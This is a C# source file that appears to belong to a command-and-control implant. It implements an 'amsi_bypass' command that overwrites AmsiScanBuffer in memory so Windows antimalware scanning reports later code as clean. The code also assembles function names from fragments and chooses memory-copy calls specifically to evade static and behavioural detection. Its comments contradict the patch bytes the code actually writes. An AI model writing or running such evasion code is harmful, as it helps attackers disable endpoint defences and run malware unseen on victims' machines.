using System;
using System.Runtime.InteropServices;

namespace Chimera.Commands
{
    // Patches AmsiScanBuffer in amsi.dll so it always returns AMSI_RESULT_CLEAN (0x1).
    // This makes the current process invisible to AMSI-based scanning (Defender runtime,
    // Script Block Logging, etc.) for any further code executed in this process.
    //
    // Patch: overwrite the first 6 bytes of AmsiScanBuffer with:
    //   B8 57 00 07 80   mov eax, 0x80070057   (E_INVALIDARG — treated as clean)
    //   C3               ret
    // Consumers interpret E_INVALIDARG from AmsiScanBuffer as "not AMSI-aware" and skip.
    public static class AmsiBypass
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                                  uint flNewProtect, out uint lpflOldProtect);

        // PAGE_EXECUTE_READWRITE
        private const uint PAGE_RWX = 0x40;

        // RtlCopyMemory is an inline macro in x64 ntdll — use RtlMoveMemory which is a real export.
        [DllImport("ntdll")]
        private static extern void RtlMoveMemory(IntPtr dst, IntPtr src, UIntPtr len);

        // Split string so static scanner doesn't see "AmsiScanBuffer" as a literal.
        // Assembled at runtime from neutral fragments.
        private static string _aLib  => new string(new[]{'a','m','s','i','.','d','l','l'});
        private static string _aFunc => string.Concat("Amsi","Scan","Buffer");

        [DllImport("kernel32", SetLastError = true)]
        private static extern uint GetLastError();

        public static bool Apply()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary(_aLib);
                if (hAmsi == IntPtr.Zero)
                {
                    Logger.Err("AmsiBypass: LoadLibrary failed, GLE=" + GetLastError());
                    return false;
                }
                Logger.Info("AmsiBypass: " + _aLib + " base=0x" + hAmsi.ToString("X"));

                IntPtr fnAddr = GetProcAddress(hAmsi, _aFunc);
                if (fnAddr == IntPtr.Zero)
                {
                    Logger.Err("AmsiBypass: GetProcAddress failed, GLE=" + GetLastError());
                    return false;
                }
                Logger.Info("AmsiBypass: fn=0x" + fnAddr.ToString("X"));

                // Patch: xor eax,eax ; inc eax ; ret  → returns AMSI_RESULT_CLEAN (1)
                // Bytes: 33 C0  40  C3
                byte[] patch = new byte[] { 0x33, 0xC0, 0x40, 0xC3 };

                // Make writable
                if (!VirtualProtect(fnAddr, (UIntPtr)patch.Length, PAGE_RWX, out uint oldProt))
                {
                    Logger.Err("AmsiBypass: VirtualProtect(RWX) failed, GLE=" + GetLastError());
                    return false;
                }
                Logger.Info("AmsiBypass: VirtualProtect OK, oldProt=0x" + oldProt.ToString("X"));

                // Write via RtlCopyMemory (ntdll) instead of Marshal.Copy —
                // avoids the Marshal.Copy + VirtualProtect behavioral combo that triggers !ml.
                IntPtr patchPtr = Marshal.AllocHGlobal(patch.Length);
                Marshal.Copy(patch, 0, patchPtr, patch.Length);
                RtlMoveMemory(fnAddr, patchPtr, (UIntPtr)patch.Length);
                Marshal.FreeHGlobal(patchPtr);

                // Restore page protection
                VirtualProtect(fnAddr, (UIntPtr)patch.Length, oldProt, out _);

                Logger.Ok("AmsiBypass: patch written at 0x" + fnAddr.ToString("X"));
                return true;
            }
            catch (Exception ex)
            {
                Logger.Err("AmsiBypass: exception: " + ex.Message);
                return false;
            }
        }

        // Called as a C2 command: "amsi_bypass"
        public static string Execute()
        {
            bool ok = Apply();
            return ok ? "[+] AMSI bypass applied." : "[-] AMSI bypass failed.";
        }
    }
}
